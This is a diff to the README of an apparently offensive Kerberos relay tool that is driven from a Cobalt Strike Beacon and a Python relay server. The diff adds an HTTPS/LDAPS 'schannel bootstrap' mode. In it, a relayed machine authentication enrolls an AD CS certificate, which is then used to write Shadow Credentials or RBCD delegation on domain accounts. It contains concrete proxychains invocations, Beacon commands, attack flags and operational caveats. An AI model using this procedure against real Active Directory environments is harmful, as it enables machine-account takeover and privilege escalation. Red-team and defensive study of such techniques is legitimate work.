@@ -8,7 +8,7 @@ Shadow Credential write, or an LDAP RBCD write. It never spawns or injects
 into another process.
 
 The project returns a verified certificate/private key or a confirmed LDAP
-attribute update. It does not perform PKINIT, request an S4U ticket, import a
+or LDAPS attribute update. It does not perform PKINIT, request an S4U ticket, import a
 ticket into the Beacon, install a service, or extract credentials.
 
 ## Contents
@@ -304,6 +304,26 @@ passwordless PFX. RBCD mode replaces the exact computer DN's descriptor with
 an owner and access DACL for only `--delegate-sid`. Its identical trustee ACEs
 preserve the same effective grant while making worker scheduling reliable.
 
+### 14. Secure LDAP uses the relayed certificate as a Schannel identity
+
+Active Directory does not permit an LDAP SASL signing or sealing layer on top
+of SSL/TLS. Because RPCSS requests Kerberos packet integrity, relaying that
+exact context directly to port 636 would require the session key that this
+split deliberately keeps out of Python. `--schannel-bootstrap` uses a bounded
+two-target sequence instead:
+
+1. The BOF relays its machine AP-REQ to AD CS Web Enrollment over HTTPS.
+2. Python releases the BOF as soon as IIS authenticates the machine.
+3. Python enrolls the selected machine template on that same HTTPS connection.
+4. Python loads the issued key pair from anonymous memory into an LDAPS client
+   certificate and connects to the DC through the SOCKS route.
+5. LDAP WhoAmI must return the expected `DOMAIN\MACHINE$` identity before the
+   selected Shadow Credential or RBCD ModifyResponse is accepted as success.
+
+The issued machine key never crosses back into the Beacon and is not written
+to disk. Shadow mode exports only its separate Shadow Credential key when the
+operator supplies a PFX output option.
+
 ## Why the BOF is reusable
 
 The original in-process approach replaced the SSPI function-table entry with
@@ -396,7 +416,9 @@ Cobalt SOCKS pivot:
 
 Python's outbound target connection is the only connection run through the
 SOCKS pivot. The KRB1 listener remains local. HTTP can use proxychains; LDAP
-also has explicit SOCKS options so the listener itself is not proxied:
+also has explicit SOCKS options so the listener itself is not proxied. When
+using `--schannel-bootstrap`, proxy the whole listener because it connects to
+both AD CS and the DC:
 
 ```sh
 proxychains4 -q -f /path/to/proxychains.conf \
@@ -417,6 +439,16 @@ proxychains4 -q -f /path/to/proxychains.conf \
   --ldap-host DC_HOST --ldap-address DC_ADDRESS \
   --ldap-socks-address 127.0.0.1 --ldap-socks-port SOCKS_PORT \
   --domain DOMAIN --machine MACHINE_NAME \
+  --ldap-target-dn 'CN=MACHINE_NAME,OU=Workstations,DC=example,DC=test' \
+  --pfx-out 'shadow-{request_id}.pfx'
+
+proxychains4 -q -f /path/to/proxychains.conf \
+  /path/to/python relay/relay_server.py \
+  --port RELAY_PORT --allow 127.0.0.1 \
+  --mode shadowcred --schannel-bootstrap \
+  --adcs-host ADCS_HOST --adcs-address ADCS_ADDRESS --adcs-tls \
+  --ldap-host DC_HOST --ldap-address DC_ADDRESS --ldap-tls \
+  --domain DOMAIN --machine MACHINE_NAME --template Machine \
   --ldap-target-dn 'CN=MACHINE_NAME,OU=Workstations,DC=example,DC=test' \
   --pfx-out 'shadow-{request_id}.pfx'
 ```
@@ -455,7 +487,8 @@ on the separate x64 KrbRelay Beacon:
 
 ```text
 krbrelay RELAY_PORT http/ADCS_HOST RPC_PORT
-krbrelay RELAY_PORT ldap/DC_HOST RPC_PORT
+krbrelay RELAY_PORT ldap/DC_HOST RPC_PORT       # direct LDAP
+krbrelay RELAY_PORT http/ADCS_HOST RPC_PORT     # HTTPS and Schannel/LDAPS
 ```
 
 Example topology with placeholders:
@@ -478,9 +511,10 @@ changing between `http/...` and `ldap/...`.
 --port PORT            KRB1 listener / target reverse-forward port
 --allow ADDRESS        only accepted KRB1 peer address
 --mode MODE            adcs, shadowcred, or rbcd
---adcs-host HOST       HTTP Host and service-SPN hostname
+--adcs-host HOST       HTTP(S) Host and service-SPN hostname
 --adcs-address ADDRESS destination used for the actual TCP connection
---adcs-port PORT        defaults to 80
+--adcs-port PORT        defaults to 80, or 443 with --adcs-tls
+--adcs-tls              use HTTPS Web Enrollment
 --domain DOMAIN        certificate subject domain
 --machine NAME         machine account name without trailing $
 --template NAME        Web Enrollment template
@@ -491,6 +525,8 @@ changing between `http/...` and `ldap/...`.
 --ldap-host HOST       hostname used by the ldap service SPN
 --ldap-address ADDRESS DC address reached by Python
 --ldap-port PORT        defaults to 389, or 636 with --ldap-tls
+--ldap-tls              use LDAPS
+--schannel-bootstrap    HTTPS relay followed by machine-certificate LDAPS
 --ldap-socks-port PORT  use an explicit local SOCKS5 route to the DC
 --ldap-target NAME     account to update; defaults to MACHINE$
 --ldap-target-dn DN    exact account DN; required for an OU or RBCD
@@ -523,8 +559,9 @@ Python must independently report:
 [+] Machine certificate acquired and key pair verified
 ```
 
-For LDAP modes, Python validates the queued ModifyResponse before it releases
-the BOF. Shadow success also requires the saved PFX to complete PKINIT; RBCD
+For direct LDAP modes, Python validates the queued ModifyResponse before it releases
+the BOF. Schannel mode releases the BOF after HTTPS authentication, then
+requires the LDAPS WhoAmI and ModifyResponse to succeed independently. Shadow success also requires the saved PFX to complete PKINIT; RBCD
 can be consumed through S4U2Self/S4U2Proxy with the controlled trustee. For AD
 CS, BOF completion occurs before enrollment finishes, so neither output stream
 is sufficient by itself.
@@ -568,9 +605,12 @@ allows the next independent invocation to reuse the process safely.
   different CLSID string.
 - An already-immutable process must advertise Negotiate or Kerberos through
   `CoQueryAuthenticationServices`.
-- AD CS mode implements HTTP/1.1 Web Enrollment, not HTTPS termination.
+- HTTP and HTTPS Web Enrollment require IIS to offer Negotiate and a template
+  the machine is permitted to enroll.
 - Direct LDAP uses a queued final-bind/write exchange because RPC requests
   packet integrity and Python deliberately does not obtain the Kerberos key.
+- `--schannel-bootstrap` is the LDAPS route. It requires reachable HTTPS Web
+  Enrollment and a machine certificate template in addition to port 636.
 - RBCD replaces the attribute with an allow DACL for the supplied SID. The SID
   should belong to a password-known computer or service account with an SPN.
 - A computer can add an NGC Shadow Credential only when no NGC value already
